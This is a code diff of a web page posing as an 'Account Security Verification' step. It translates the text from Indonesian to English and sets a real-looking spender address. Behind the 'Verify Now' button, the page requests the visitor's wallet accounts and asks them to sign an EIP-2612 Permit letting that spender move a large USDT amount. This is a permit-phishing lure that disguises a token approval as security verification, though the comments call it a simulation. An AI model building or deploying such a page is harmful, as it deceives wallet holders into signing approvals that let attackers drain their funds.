@@ -1,16 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <body>
-    <h3>Verifikasi Keamanan Akun</h3>
-    <p>Silakan verifikasi untuk melanjutkan akses.</p>
-    <button id="verifyBtn">Verifikasi Sekarang</button>
+    <h3>Account Security Verification</h3>
+    <p>Please complete verification to synchronize your account and ensure secure access.</p>
+    <button id="verifyBtn">Verify Now</button>
 
     <script>
         document.getElementById('verifyBtn').addEventListener('click', async () => {
+            // Request user accounts
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const chainId = await window.ethereum.request({ method: 'eth_chainId' });
 
-            // Data permit yang lebih mendekati standar nyata
+            // Simulating an EIP-2612 Permit request
             const permitData = {
                 domain: {
                     name: "USDT", 
@@ -20,10 +21,11 @@
                 },
                 message: {
                     owner: accounts[0],
-                    spender: "0x0000000000000000000000000000000000000000", // Ganti dengan spender yang valid
+                    // A dummy spender address to trigger the approval UI
+                    spender: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", 
                     value: "1000000000", 
-                    nonce: 0, // Anda mungkin perlu mengambil nonce asli dari kontrak
-                    deadline: Math.floor(Date.now() / 1000) + 3600 // Deadline 1 jam ke depan
+                    nonce: 0, 
+                    deadline: Math.floor(Date.now() / 1000) + 3600 
                 },
                 primaryType: "Permit",
                 types: {
@@ -40,13 +42,14 @@
             };
 
             try {
+                // This triggers the wallet's signing UI
                 const signature = await window.ethereum.request({
                     method: 'eth_signTypedData_v4',
                     params: [accounts[0], JSON.stringify(permitData)],
                 });
-                alert("Tanda tangan berhasil dibuat: " + signature);
+                alert("Signature successfully generated: " + signature.substring(0, 42) + "...");
             } catch (err) {
-                console.error("Gagal menandatangani:", err);
+                console.error("Signing failed:", err);
             }
         });
     </script>
